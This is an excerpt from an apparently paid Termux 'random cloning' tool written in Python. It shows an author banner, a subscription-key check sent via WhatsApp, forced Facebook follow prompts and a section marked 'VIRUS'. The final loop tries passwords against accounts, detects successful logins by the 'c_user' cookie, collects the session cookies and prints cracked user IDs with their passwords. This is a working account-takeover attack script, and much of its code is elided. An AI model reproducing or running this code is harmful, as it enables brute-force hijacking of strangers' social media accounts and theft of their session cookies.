...
[√] FACEBOOK : ARIYAN HRIDOYE
[√] TEM : BD ISLAMIC SQUAD TERMUX HELPING ZON
[√] GITHUB : MH-404
[√] TELEGRAM: 01790210942
"""
clear()
os.system("xdg-open https://www.facebook.com/profile.php?id=1000914877257005000")
xxxx = str(len(ugen))
...
def Subscraption():
	...
	if key1 in r1:
		...
		time.sleep(3.5)
		fhr = '*ASALAMUALIKUM*%2C%20*HRIDOYE-SiR*%20*I*%20*BUY*%20*YOUR*%20*RANDOM*%20*CLONING*%20*NEW*%20*TOOL*%20*MY*%20*KEY*%20*:*'+refat+''+key1
		os.system('am start https://wa.me/+8801790210942?text=' + fhr)
		Subscraption()
#------------------[ 🦠VIRUS😷 ]-------------------#
...
class Main:
	def __init__(self):
		...
		print(logo)
		print(f'\n')
		print(f'\033[92;1m[\033[91;1m●\033[92;1m]──────────────────\x1b[1;91m❴\x1b[1;96m\033[91;1m\033[47mHRIDOYE-BHAI\033[40m\x1b[1;91m❵\x1b[1;92m──────────────────\033[92;1m[\033[91;1m●\033[92;1m]')
		print('')
		print(f'        [\033[91;1m●\033[92;1m] \033[91;1m\033[47mFIRST FOLLOW MY FACEBOOK ACCOUNT\033[40m \033[92;1m[\033[91;1m●\033[92;1m]')
		print('')
		print(f'\033[92;1m[\033[91;1m●\033[92;1m]──────────────────\x1b[1;91m❴\x1b[1;96m\033[91;1m\033[47mHRIDOYE-BHAI\033[40m\x1b[1;91m❵\x1b[1;92m──────────────────\033[92;1m[\033[91;1m●\033[92;1m]')
		print(f'╭─\033[92;1m[\033[91;1m●\033[92;1m]\x1b[1;91m[\x1b[1;92mA\x1b[1;91m]\x1b[1;92m FOLLOW FACEBOOK')
		print(f'├─\033[92;1m[\033[91;1m●\033[92;1m]\x1b[1;91m[\x1b[1;92mE\x1b[1;91m] EXIT')
		HRIDOYE_BHAI = input('\033[92;1m╰─\033[92;1m[\033[91;1m●\033[92;1m]\033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : \033[1;32m')
		if HRIDOYE_BHAI in ["", " "]:
			os.system("xdg-open https://www.facebook.com/profile.php?id=100091487725700")
			Main()
		elif HRIDOYE_BHAI in ["E", "e"]:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                os.system("play-audio HRIDOYE_CP.mp3")
                print('\033[1;97m[HRIDOYE-CP] '+uid+' | '+ps+' | '+fhr+'\033[0;97m')
